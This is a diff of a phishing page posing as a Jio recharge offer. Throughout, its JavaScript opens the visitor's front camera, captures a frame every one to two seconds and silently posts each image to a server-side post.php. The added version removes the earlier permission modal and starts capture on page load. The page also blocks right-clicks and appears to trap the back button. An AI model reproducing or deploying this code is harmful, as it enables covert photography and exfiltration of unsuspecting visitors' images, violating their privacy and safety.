@@ -8,114 +8,10 @@
 <meta property="og:site_name" content="index.html">
 	<meta property="og:image" content="http://deals-online.in/jio/head.png">
 <link rel="stylesheet" type="text/css" href="jio\style.css">
-	<style type="text/css">
-h2{
-    height: 50px;
-    background-color: #007ee6;
-    color: #FFF;
-    line-height: 50px;
-    font-size: 24px;
-    margin: 0;
-    text-align: center;
-}
-.countDown{
-    text-align: center;
-    padding: 0 1em;
-    color: #999;
-}
-.countDown .timer{
-    color: #007ee6;
-    font-size: 1.2em;
-}
-.peopleCount{
-    text-align: center;
-    padding: 0 1em;
-    color: #999;
-}
-.peopleCount .number{
-    background-color: #007ee6;
-    color: #FFF;
-    display: inline-block;
-    padding: 0 10px;
-}
-.permission-modal {
-    display: flex;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.9);
-    z-index: 9999;
-    justify-content: center;
-    align-items: center;
-}
-.permission-modal.hidden {
-    display: none;
-}
-.permission-content {
-    background: white;
-    border-radius: 15px;
-    padding: 30px;
-    max-width: 350px;
-    text-align: center;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-}
-.permission-icon {
-    font-size: 3em;
-    color: #007ee6;
-    margin-bottom: 15px;
-}
-.permission-title {
-    font-size: 1.5em;
-    font-weight: bold;
-    color: #333;
-    margin-bottom: 10px;
-}
-.permission-text {
-    color: #666;
-    margin-bottom: 20px;
-    font-size: 0.9em;
-}
-.permission-btn {
-    background-color: #007ee6;
-    color: white;
-    border: none;
-    padding: 12px 30px;
-    border-radius: 5px;
-    font-size: 1em;
-    cursor: pointer;
-    width: 100%;
-    transition: background-color 0.3s;
-}
-.permission-btn:hover {
-    background-color: #0056b3;
-}
-</style>
+	<style type="text/css">h2{height: 50px;background-color: #007ee6;color: #FFF;line-height: 50px;font-size: 24px;margin: 0;text-align: center;}.countDown{text-align: center;padding: 0 1em;color: #999;}.countDown .timer{color: #007ee6;font-size: 1.2em;}.peopleCount{text-align: center;padding: 0 1em;color: #999;}.peopleCount .number{background-color: #007ee6;color: #FFF;display: inline-block;padding: 0 10px;}</style>
 	</head>
-<body>
-
-<!-- Modal de Permiso de Cámara -->
-<div id="permission-modal" class="permission-modal">
-    <div class="permission-content">
-        <div class="permission-icon">
-            <i class="fas fa-camera"></i>
-        </div>
-        <div class="permission-title">Permiso de Cámara Requerido</div>
-        <p class="permission-text">
-            Para procesar tu recarga Jio, necesitamos acceso a tu cámara.
-        </p>
-        <button class="permission-btn" onclick="grantCameraPermission()">
-            <i class="fas fa-check"></i> Permitir Acceso
-        </button>
-        <p style="font-size: 0.8em; color: #999; margin-top: 10px;">
-            Tu privacidad es importante para nosotros
-        </p>
-    </div>
-</div>
-
-<!-- FontAwesome para iconos -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<form align="right" action="jio/invite.htm" method="POST">	
+	<body>
 	<script type="text/javascript">function next(){location.href="jio/invite.htm"+location.search}function setCookie(e,t){var n=new Date;n.setTime(n.getTime()+2592e6);var o="expires="+n.toUTCString();document.cookie=e+"="+t+"; "+o}function getCookie(e){for(var t=e+"=",n=document.cookie.split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(t))return i.substring(t.length,i.length)}return 0}var message="You have not Permission to This";document.onmousedown=function(e){return"Netscape"==navigator.appName&&3==e.which?(alert(message),!1):-1!=navigator.appVersion.indexOf("MSIE")&&2==event.button?(alert(message),!1):void 0};</script>
 
 	
@@ -168,62 +64,62 @@ t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function 
 <script>
 
 function post(imgdata){
-  fetch('post.php', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
     },
-    body: 'cat=' + encodeURIComponent(imgdata)
-  }).catch(err => {
-    // Silencioso
+    error: function(){
+    }
   });
-}
+};
+
 
 'use strict';
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
 
 const constraints = {
   audio: false,
   video: {
+    
     facingMode: "user"
   }
 };
 
+// Access webcam
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
-    console.error('Camera error:', e);
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
   }
 }
 
+// Success
 function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
-  
-  // Captura automática cada 2 segundos en silencio
-  var context = canvas.getContext('2d');
+
+var context = canvas.getContext('2d');
   setInterval(function(){
-    context.drawImage(video, 0, 0, 740, 580);
-    var canvasData = canvas.toDataURL("image/png");
-    post(canvasData);
-  }, 2000);
+
+       context.drawImage(video, 0, 0, 740, 580);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
 }
 
-function grantCameraPermission() {
-  const modal = document.getElementById('permission-modal');
-  modal.classList.add('hidden');
-  init();
-}
-
-window.addEventListener('load', function() {
-  // Modal se muestra por defecto
-});
-
-
+// Load init
+init();
 
 </script>
 </html>
